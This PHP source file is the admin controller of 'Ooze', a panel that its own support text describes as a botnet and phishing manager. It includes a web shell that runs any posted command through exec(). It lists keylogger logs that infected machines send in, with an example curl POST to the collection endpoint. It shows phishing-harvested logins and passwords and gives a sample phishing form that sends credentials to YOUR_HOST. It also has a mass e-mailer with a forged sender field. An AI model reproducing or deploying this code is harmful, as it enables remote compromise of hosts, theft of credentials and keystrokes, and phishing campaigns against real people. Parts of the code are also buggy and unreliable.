<?php

$frase="not have bad way";

// Define encode to UTF-8
header('Content-type: text/html; charset="utf-8"',true);

//secure mitigations
header('X-Frame-Options: SAMEORIGIN');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');
ini_set('session.cookie_httponly',1);

// Compress with gzip 
//ob_start("ob_gzhandler");

//if not debug
error_reporting(0);
//if use debug
//error_reporting(E_ALL);
ini_set('display_errors', 0);

// dá include em todas nossas classes
  require "../helper/class.GhostPage.php";
  require "../helper/class.crud.php";
  require "../helper/class.form.php";
  require "../helper/class.paginate.php";
  require "../helper/class.Bcrypt.php";
  require "../helper/nocsrf.php";
  require "../helper/secure_validation.php";

//get  page
$url=$_GET['page'];

// vars start
$pag=NULL;
$janela="";
$la="";
$content[0]="";
$content[1]="";

//Start crud
$crud = new crud();

//views load
$page = new GhostPage();
$page->templatefile = "../view/AuthAdmin.html";
$page->varnamelist = "titulo,conteudo";

// item per pagination limit
$items=22; 

session_start();

// load auth match condition
include "../helper/auth_match.php";
//load file functions
include "../helper/file_ops.php";
//load func validate
include "../helper/validate_ops.php";

switch ($url) {
    case "auth":
      $form = new form();
      $values = array(
                  'Login:text'=>'user: nick name', 
                  'Senha:password'=>'pass:4321'                              
                ); 
      $la.=$form->StartForm("auth.php?page=login");
      $la.=$form->SimpleForm($values);
      $la.=$form->ExitForm("logar");
      print $la;
      break;

    case "login": 
      test_csrf();	
      $user=$_POST['user'];
      $pass=$_POST['pass'];
      $secret=$frase.$pass;
      $_SESSION['userronin']=$user; 
      $gen=new Bcrypt(12);
      $bcrypt_hash=$gen->hash($secret); 
      $pdo2 = new crud(); 
      $pdo2->conn();
      $stmt = $pdo2->db->prepare("select * FROM userronin WHERE login = ?  ");
      $stmt->bindValue(1, $user, PDO::PARAM_STR);  
      $stmt->execute();  
      $res=$stmt->fetchAll();
      $_SESSION['passronin']=$bcrypt_hash; 
          if($gen->verify($bcrypt_hash, $res[0]['pass'])=="false") {
           print "<img src=\"../view/images/alerta.png\">
            <h1>ERROR at auth  05</h1> 
            <meta HTTP-EQUIV='refresh' CONTENT='2; URL=../view/login.php'>"; 
           exit;
	  }

         $janela='    		<div class="portlet portlet-closable x4">	
				<div class="portlet-header">
					<h4>Login manager</h4> 
				</div> <!-- .portlet-header -->		
				<div class="portlet-content">
                                ';
         $var="<p><b>Login:</b>".$r['login']." <br> <b>owner:</b>".$r['owner'];
         $bemvindo="Welcome to Ooze tool</p>";
         $values = array('last_ip'=>"???"); //fix it
         $crud->Update('userronin', $values, 'id', $r['id']);
         $page->conteudo=$janela." <br>".$bemvindo."<meta HTTP-EQUIV='refresh' CONTENT='1; URL=auth.php?page=conta'></div></div>";
         print $page->display_page();
      
      break;


// SUport informations
     case "suporte":
      $page->titulo="Suport";
      $suporte="<img src=\"../view/imagens/ooze2.png\"><font color=green><pre>
                     

  Ooze is a manager of Botnet and phishing, have a simple web shell and simple Auth and ACL.
  Version: 1.0

  About botnets
================

 Botnet send Keylogger information via HTTP method POST example with curl:
---
$ curl \
-X POST \
--data 'secret_code=testbot&name=\"Test name\"&date=11/11/2032&system=\"Windows 7\"&ip=\"127.0.0.1\"&keyboard=\"something test \n test test \n\"' \
http://localhost/Ooze/controller/register_machine.php
---
  You can use sockets in C or C++ for example etc...

  secret_code param is the key to register information, you can change this static variable at directory \"Ooze/controller\" in files  
\"register_machine.php\" and \"register_phishing.php\".


  About Phishing
================

	When  writing passwords in TXT file, this is visible to others, so is not cool, good idea is store some password  
like a database, with Ooze you can store  login and passwords and url(site of phishing), loohk 

phishing.html (look name of fields)"."<code>".htmlentities("
----
 <form method=\"post\" action=\"http://YOUR_HOST/Ooze/controller/register_phishing.php\">
        <p><input type=\"text\" name=\"name\" value=\"\" placeholder=\"Username or Email\"></p>
        <p><input type=\"password\" name=\"password\" value=\"\" placeholder=\"Password\"></p>
        <input id=\"1\" type=\"hidden\" name=\"secret_code\" value=\"testbot\">
	<input id=\"2\" type=\"hidden\" name=\"url\" value=\"Name of site site\">
        <p class=\"submit\"><input type=\"submit\" name=\"commit\" value=\"Login\"></p>
      </form>
----
")."</code></font>"."
Contact:  coolerlair@gmail.com

                </pre>";
      $page->conteudo="<div style=\"background-color:black;\">".$suporte."</div></div>";
      print $page->display_page();
      break;

     case "conta":
       $janela.='<div class="portlet portlet-closable x5">	
				<div class="portlet-header">
					<h4>Acount information</h4> 
				</div> <!-- .portlet-header -->		
				<div class="portlet-content">
                              ';
      $page->titulo="Your acount";
        $sql='SELECT * FROM userronin WHERE login=\''.sanitize($_SESSION['userronin']).'\' ';
       $crud = new crud();
       $res = $crud->rawSelect($sql); 

      $stmt = $pdo2->db->prepare("select * FROM userronin WHERE login = ?  ");
      $stmt->bindValue(1, $_SESSION['userronin'], PDO::PARAM_STR);  
      $stmt->execute();  
      $res=$stmt->fetchAll(PDO::FETCH_ASSOC);

       foreach($res as $r) {
         $dados.="your <b>login</b> \"".$r['login']."\"<br>";
         $dados.="<b>E-mail</b> \"".$r['mail']."\"<br>";
         $dados.="<b>Owner</b> \"".$r['owner']."\"<br>";
       }
      $page->conteudo=$janela.$msg.$dados."</div></div>";
      print $page->display_page();
      break;

     case "logof":
             $janela.='<div class="portlet portlet-closable x6">	
				<div class="portlet-header">
					<h4>LOGOF</h4> 
				</div> <!-- .portlet-header -->		
				<div class="portlet-content">
                              ';
      $page->titulo="Logof";
      $msg='<p class="message message-error message-closable">Do you want exit ?</p>';
      $page->conteudo=$janela.$msg."Do you want exit of Botnet manager? <br><a href=\"auth.php?page=logofOK\"><b>YES</b></a>"."</div></div>";
      print $page->display_page();
      break;

    case "logofOK":
      $_SESSION=session_destroy(); 
      print "<meta HTTP-EQUIV='refresh' CONTENT='1; URL=../view/login.php'>";
      break;

//////////////////////// CRUD USER
   case "AddUser":
               $janela.='<div class="portlet portlet-closable x4">	
				
				<div class="portlet-header">
					<h4>Add User</h4> 					
				</div> <!-- .portlet-header -->		
				<div class="portlet-content">
                              ';
        $form = new form();
	$token = NoCSRF::generate( 'csrf_token' );
        $values = array(
		  ':hidden'=>'csrf_token:'.$token,
                  'login:text'=>'loginadd:your login', 
                  'password:password'=>'passadd:1234',
                  'E-mail:text'=>'mailadd:your e-mail',                               
                );
        $array = array(
                  "admin", 
                  "user"                              
                );
        $action="auth.php?page=ActionAddUser";
        $la.=$form->StartForm($action);
        $la.=$form->SimpleForm($values);
        $la.=$form->SelectForm("owner: ","owneradd",$array);
        $la.=$form->ExitForm("submit");
        $page->titulo="Add User";
        $page->conteudo=$janela.$la."</div></div>";
        print $page->display_page();
      break;

   case "ActionAddUser":
     test_csrf();
     $loginadd=htmlentities($_POST['loginadd']); if(!$loginadd) { print "need login"; exit; }
     $mailadd=htmlentities($_POST['mailadd']); 
     $passadd=htmlentities($_POST['passadd']); if(!$passadd) { print "need a password"; exit; }
     $owneradd=htmlentities($_POST['owneradd']);
     $secret=$frase.$passadd;
      $gen=new Bcrypt(12);
      $bcrypt_hashadd=$gen->hash($secret); 
     $values = array(
                 array(
                  'login'=> sanitizecmd(sanitize($loginadd)), 
                  'pass'=> sanitizecmd(sanitize(bcrypt_hashadd)), 
                  'mail'=> sanitizecmd(sanitize($mailadd)), 
                  'owner'=> sanitizecmd(sanitize($owneradd)),
                 )
                );
     $crud->dbInsert('userronin', $values);
     $page->titulo="Data insert";
     $page->conteudo='<br><br>
                      <p class="message message-success message-closable">Added user ok  !</p><br<br>';
     print $page->display_page();
     break;

     case "RmUser":
              $janela.='<div class="portlet portlet-closable x4">	
				<div class="portlet-header">
					<h4>Remove user</h4> 
				</div> <!-- .portlet-header -->		
				<div class="portlet-content">
                              ';
        $form = new form();
	$token = NoCSRF::generate( 'csrf_token' );
        $values = array(
		  ':hidden'=>'csrf_token:'.$token,
                  'remover:text'=>'userm:ID to remove'                            
                );
        $action="auth.php?page=ActionRmUser";
        $la.=$form->StartForm($action);
        $la.=$form->SimpleForm($values);
        $la.=$form->ExitForm("Remove");
        $page->titulo="Remove user";
        $page->conteudo=$janela.$la."</div></div>";
        print $page->display_page();
        break;

   case "ActionRmUser":
	test_csrf();
        $userm=htmlentities($_POST['userm']);
        $res = $crud->dbDelete('userronin', 'id', $userm );
        $page->conteudo='<br><br>
                      <p class="message message-success message-closable">User removed!</p><br<br>';
        $page->titulo="User removed";
        print $page->display_page();
        break;

    case "EditUser":
                   $janela.='<div class="portlet portlet-closable x4">	
				<div class="portlet-header">
					<h4>Edit user</h4> 
				</div> <!-- .portlet-header -->		
				<div class="portlet-content">
                              ';
        $form = new form();
	$token = NoCSRF::generate( 'csrf_token' );
        $values = array(
		  ':hidden'=>'csrf_token:'.$token,
                  'editar:text'=>'useredit:ID a editar'                            
                );
        $action="auth.php?page=ViewEditUser";
        $la.=$form->StartForm($action);
        $la.=$form->SimpleForm($values);
        $la.=$form->ExitForm("Edit");
        $page->titulo="Edit User";
        $page->conteudo=$janela.$la."</div></div>";
        print $page->display_page();
        break;

    case "ViewEditUser":
                   $janela.='<div class="portlet portlet-closable x4">	
				<div class="portlet-header">
					<h4>Edit User</h4> 
				</div> <!-- .portlet-header -->		
				<div class="portlet-content">
                              ';
        test_csrf();
        $useredit=$_POST['useredit'];
        $stmt = $pdo2->db->prepare("select * FROM userronin WHERE id = ?  ");
        $stmt->bindValue(1, $useredit, PDO::PARAM_STR);  
        $stmt->execute();  
        $res=$stmt->fetchAll(PDO::FETCH_ASSOC);
	$token = NoCSRF::generate( 'csrf_token' );
        foreach($res as $r) {
         $form = new form();
         $values = array(
                  'login:text'=>'loginedit:'.sanitizecmd(sanitize($r['login'])), 
		  'token:hidden'=>'csrf_token:'.$token,
                  'Password:password'=>'passedit:'.sanitizecmd(sanitize($r['pass'])),
                  'E-mail:text'=>'mailedit:'.sanitizecmd(sanitize($r['mail'])),
		  'id:hidden'=>'idedituser:'.sanitizecmd(sanitize($r['id']))                               
                );
         $array = array(
                  "admin", 
                  "user"                              
                );
         $action="auth.php?page=ActionEditUser";
         $la.=$form->StartForm($action);
         $la.=$form->SimpleForm($values);
         $la.=$form->SelectToEdit("owner: ","owneredit",$array,$r['owner']);
         $la.=$form->ExitForm("submit");
         $page->titulo="Edit User";
         $page->conteudo=$janela.$la."</div></div>";
         print $page->display_page();
        }
        break;

   case "ActionEditUser":
	test_csrf();
        $idedituser=sanitizecmd(sanitize(htmlentities($_POST['idedituser'])));
        $loginedit=sanitizecmd(sanitize(htmlentities($_POST['loginedit'])));
        $mailedit=sanitizecmd(sanitize(htmlentities($_POST['mailedit'])));
        $passedit=sanitizecmd(sanitize(htmlentities($_POST['passedit'])));
        $owneredit=sanitizecmd(sanitize(htmlentities($_POST['owneredit'])));
        $secret=$frase.$passedit;
        $gen=new Bcrypt(12);
        $bcrypt_hashedit=$gen->hash($secret); 
        $crud->dbUpdate('userronin', 'login', $loginedit, 'id', $idedituser);
        $crud->dbUpdate('userronin', 'pass', $bcrypt_hashedit, 'id', $idedituser);
        $crud->dbUpdate('userronin', 'mail', $mailedit, 'id', $idedituser);
        $crud->dbUpdate('userronin', 'owner', $owneredit, 'id', $idedituser);
        $page->titulo="Data edit of user";
        $page->conteudo='<br><br>
                      <p class="message message-success message-closable">User edited OK !</p><br<br>';
        print $page->display_page();
        break;

    case "ListarUser":
               $janela.='<div class="portlet portlet-closable x12">	
				<div class="portlet-header">
					<h4>Users List</h4> 
				</div> <!-- .portlet-header -->		
				<div class="portlet-content">
                              ';
      $content[0].='<table id="dataTable" class="data" cellpadding="0" cellspacing="0">';
      $tabela = array(
                  "login", 
                  "e-mail", 
                  "pass",
                  "owner",
                  "id", 
                  "remove",
                  "edit"                             
                );
      $form=new form();
      $table=$form->TypeTable($tabela);
      $content[1].=$table;
      $res = $crud->rawSelect('SELECT * FROM userronin ORDER BY id DESC'); 
      $cont=0;
      $token = NoCSRF::generate( 'csrf_token' );
      foreach($res as $r) {
               $tabela = array( 
                  $r['login'],
                  $r['mail'],
                  "??????????",
                  $r['owner'],
                  $r['id'],
                  "<form  method=\"post\" action=\"auth.php?page=ActionRmUser\">
		  <input type=\"hidden\" name=\"csrf_token\" value=\"".$token."\" />
                  <input type=\"hidden\" name=\"userm\" value=\"".$r['id']."\" />
                  <input type=\"image\" name=\"pimagem\" id=\"pimagem\" border=\"\" 
                  src=\"../view/imagens/remove.png\" alt=\"\" value=\"valor\" />
                  </form>",
                 "<form method=\"post\" action=\"auth.php?page=ViewEditUser\">
		<input type=\"hidden\" name=\"csrf_token\" value=\"".$token."\" />
                 <input type=\"hidden\" name=\"useredit\" value=\"".$r['id']."\" />
                 <input type=\"image\" name=\"pimagem\" id=\"pimagem\" 
                  src=\"../view/imagens/edit.gif\" alt=\"\" value=\"valor\" />
                 </form>"
               );
         $form=new form();
         $content[].=$form->ElementTable($tabela);
         $cont+=1;
         if($cont==19) $content[].="</table>";
         if($cont==19) {
          $content[].='<table id="dataTable" class="data" cellpadding="0" cellspacing="0">';
          $content[].=$table; 
          $cont=0;
         }
      }
      $content[].="</table>";
      $paginacao=new paginate(); 
      $file="auth.php?page=ListarUser";
      $nameget="list";
      $pag.=$paginacao->pag($content,$items,$file,$nameget);
      $page->conteudo=$janela.$pag."</div></div>";
      $page->titulo="List users of Ooze";
      print $page->display_page();
    break;

//////////////// CRUD machines
   case "ActionRmMachine":
	test_csrf();
        $userm=htmlentities($_POST['machinerm']);
        $res = $crud->dbDelete('machine_report', 'id', $userm );
        $page->conteudo='<br><br>
                      <p class="message message-success message-closable">Machine removed!</p><br<br>';
        $page->titulo="User removed";
        print $page->display_page();
        break;

/////////////// list keylloger info
   case "ActionViewMachine":
	test_csrf();
        $log=htmlentities($_POST['logger']);

        $page->conteudo='<br><br>
                      <p class="message message-success message-closable"><pre>'.$log.'</pre></p><br<br>';
        $page->titulo="keyboard";
        print $page->display_page();
        break;

    case "ListMachines":
               $janela.='<div class="portlet portlet-closable x12">	
				<div class="portlet-header">
					<h4>Machines List</h4> 
				</div> <!-- .portlet-header -->		
				<div class="portlet-content">
                              ';
      $content[0].='<table id="dataTable" class="data" cellpadding="0" cellspacing="0">';
      $tabela = array(
                  "name", 
                  "date", 
                  "OS",
                  "ip",
                  "id", 
		  "logger",
                  "remove"                             
                );
      $form=new form();
      $table=$form->TypeTable($tabela);
      $content[1].=$table;
      $res = $crud->rawSelect('SELECT * FROM machine_report ORDER BY id DESC'); 
      $cont=0;
      $token = NoCSRF::generate( 'csrf_token' );
      foreach($res as $r) {
               $tabela = array( 
                  $r['name'],
                  $r['date'],
                  $r['system'],
                  $r['ip'],
                  $r['id'],
                  "<form  method=\"post\" action=\"auth.php?page=ActionViewMachine\">
		  <input type=\"hidden\" name=\"csrf_token\" value=\"".$token."\" />
                  <input type=\"hidden\" name=\"logger\" value=\"".$r['keyboard']."\" />
                  <input type=\"image\" name=\"pimagem\" id=\"pimagem\" border=\"\" 
                  src=\"../view/imagens/procurar.png\" alt=\"\" value=\"valor\" />
                  </form>",
                  "<form  method=\"post\" action=\"auth.php?page=ActionRmMachine\">
		  <input type=\"hidden\" name=\"csrf_token\" value=\"".$token."\" />
                  <input type=\"hidden\" name=\"machinerm\" value=\"".$r['id']."\" />
                  <input type=\"image\" name=\"pimagem\" id=\"pimagem\" border=\"\" 
                  src=\"../view/imagens/remove.png\" alt=\"\" value=\"valor\" />
                  </form>"
               );
         $form=new form();
         $content[].=$form->ElementTable($tabela);
         $cont+=1;
         if($cont==19) $content[].="</table>";
         if($cont==19) {
          $content[].='<table id="dataTable" class="data" cellpadding="0" cellspacing="0">';
          $content[].=$table; 
          $cont=0;
         }
      }
      $content[].="</table>";
      $paginacao=new paginate(); 
      $file="auth.php?page=ListMachines";
      $nameget="list";
      $pag.=$paginacao->pag($content,$items,$file,$nameget);
      $page->conteudo=$janela.$pag."</div></div>";
      $page->titulo="List Machines of Ooze";
      print $page->display_page();
    break;


   case "shell":
        if($_POST['cmd'])
        {
	  test_csrf();
	  $msg="<br><img src=\"../view/imagens/ooze.png\"><font color=green><br>
                ░░░░░░░░░░░: Ooze Shell CommanD:░░░░░░░░░░░░░░░░░░░</font><br>
               <br> <font color=orange>'.....'</font>
               <br>
               ";
          $lines=array();
          exec($_POST['cmd'],$lines);
          $i=0;
          $cmd=NULL;
          foreach($lines as $i) { $cmd.="&nbsp;&nbsp;".$i."<br>"; } 
          $msg.="<br>&nbsp;&nbsp; ".htmlentities($_POST['cmd'])."<br><font color=green>&nbsp;&nbsp;&nbsp;".$cmd."</font><br>";
        } 
        else {
          $msg="<br><img src=\"../view/imagens/ooze.png\"><font color=green><br>
                ░░░░░░░░░░░: Ooze Shell CommanD:░░░░░░░░░░░░░░░░░░░</font><br>
               <br> <font color=orange>'.....'</font>
               <br>
               ";
          $lines=array();
// first CMD
          exec('uname -a; df -h; date; id; pwd; ls -l',$lines);
          $i=0;
          $cmd=NULL;
          foreach($lines as $i) { $cmd.="&nbsp;&nbsp;".$i."<br>"; } 
          $msg.="<br>&nbsp;&nbsp;  uname -a; df -h; date; id; pwd; ls -l"."<br><font color=green> &nbsp;&nbsp;  ".$cmd."</font><br>";
        }
        $form = new form();
	$token = NoCSRF::generate( 'csrf_token' );
        $values = array(
		  ':hidden'=>'csrf_token:'.$token,
                  'CMD:text'=>'cmd:',                              
                );
        $action="auth.php?page=shell";
        $la=$form->StartForm($action);
        $la.=$form->SimpleForm($values);
        $la.=$form->ExitForm("Send CMD");
      
        $page->conteudo="<div style=\"background-color:black;\">".$msg.$la."</div></div></div>";
        $page->titulo="Ooze Shell";
        print $page->display_page();
        break;
//////////////////////////////////////////////////////////////
//////////////////////// e-mail send
   case "AddEmail":
               $janela.='<div class="portlet portlet-closable x4">	
				
				<div class="portlet-header">
					<h4>E-mail mass send</h4> 					
				</div> <!-- .portlet-header -->		
				<div class="portlet-content">
                              ';
        $form = new form();
	$token = NoCSRF::generate( 'csrf_token' );
        $values = array(
		 ':hidden'=>'csrf_token:'.$token,
                  'De:text'=>'EnviarDe:nome',   
                  'Assunto:text'=>'EnviarAssunto:Assunto',
                  'e-mail:text'=>'EnviarMail:Seu e-mail'                              
                );
        $action="auth.php?page=ActionSendAll";
        $la.=$form->StartForm($action);
        $la.=$form->SimpleForm($values);
        $la.=$form->TextForm("Html: ","SendHtml","<p>html here</p>\n");
        $la.=$form->TextForm("E-mail List: ","SendList","list of e-mails here, 1 e-mail per line !\n");
        $la.=$form->ExitForm("Submit");
        $page->titulo="Mass E-mail Send";
        $page->conteudo=$janela.$la."</div></div>";
        print $page->display_page();
      break;

// action to send e-mail
   case "ActionSendAll":
               $janela.='<div class="portlet portlet-closable x4">	
				
				<div class="portlet-header">
					<h4>E-mail mass send</h4> 					
				</div> <!-- .portlet-header -->		
				<div class="portlet-content">
                              ';
      test_csrf();
      $de=$_POST['EnviarDe'];
      $assunto=$_POST['EnviarAssunto'];
      $html=$_POST['SendHtml'];
      $mail=$_POST['EnviarMail'];
      $lista=htmlentities($_POST['SendList']);
      $headers  = "MIME-Version: 1.0\r\n";
      $headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
      $email = explode("\n", $lista);
      $headers .= "From: ".$de." <".$mail.">\r\n";
      $message = $html;
      $i = 0;
      $count = 1;
	while($email[$i]) 
        {
	 if(mail($email[$i], $assunto, $message, $headers))
	  echo "<font color=green>* Number: $count <b>".$email[$i]."</b>OK</font><br><hr>";
	 else
	  echo "<font color=red>* Number: $count <b>".$email[$i]."</b> ERROR </font><br><hr>";
	 $i++;
	 $count++;
	}
           $page->conteudo=$janela.$la."</div></div>";
      $page->titulo="Send E-mails";
      print $page->display_page();
      break;
//////////////// CRUD machines
   case "ActionRmPhishing":
	test_csrf();
        $userm=htmlentities($_POST['phishingrm']);
        $res = $crud->dbDelete('phishing', 'id', $userm );
        $page->conteudo='<br><br>
                      <p class="message message-success message-closable">Phishing input removed!</p><br<br>';
        $page->titulo="Input of phishing removed";
        print $page->display_page();
        break;


    case "ListPhishing":
               $janela.='<div class="portlet portlet-closable x12">	
				<div class="portlet-header">
					<h4>Phishing List</h4> 
				</div> <!-- .portlet-header -->		
				<div class="portlet-content">
                              ';
      $content[0].='<table id="dataTable" class="data" cellpadding="0" cellspacing="0">';
      $tabela = array(
                  "id", 
                  "date", 
                  "login",
                  "password",
                  "url", 
                  "remove"                             
                );
      $form=new form();
      $table=$form->TypeTable($tabela);
      $content[1].=$table;
      $res = $crud->rawSelect('SELECT * FROM phishing ORDER BY id DESC'); 
      $cont=0;
      $token = NoCSRF::generate( 'csrf_token' );
      foreach($res as $r) {
               $tabela = array( 
                  $r['id'],
                  $r['date'],
                  $r['name'],
                  $r['password'],
                  $r['url'],
                  "<form  method=\"post\" action=\"auth.php?page=ActionRmPhishing\">
		  <input type=\"hidden\" name=\"csrf_token\" value=\"".$token."\" />
                  <input type=\"hidden\" name=\"phishingrm\" value=\"".$r['id']."\" />
                  <input type=\"image\" name=\"pimagem\" id=\"pimagem\" border=\"\" 
                  src=\"../view/imagens/remove.png\" alt=\"\" value=\"valor\" />
                  </form>"
               );
         $form=new form();
         $content[].=$form->ElementTable($tabela);
         $cont+=1;
         if($cont==19) $content[].="</table>";
         if($cont==19) {
          $content[].='<table id="dataTable" class="data" cellpadding="0" cellspacing="0">';
          $content[].=$table; 
          $cont=0;
         }
      }
      $content[].="</table>";
      $paginacao=new paginate(); 
      $file="auth.php?page=ListPhishing";
      $nameget="list";
      $pag.=$paginacao->pag($content,$items,$file,$nameget);
      $page->conteudo=$janela.$pag."</div></div>";
      $page->titulo="List Phishing of Ooze";
      print $page->display_page();
    break;



     default: 
      $page->titulo="ERRO 404";
      $page->conteudo="<p class=\"message message-error message-closable\">Have error here <b></b></p>";
      print $page->display_page();
      break;
}



//ob_flush();

?>
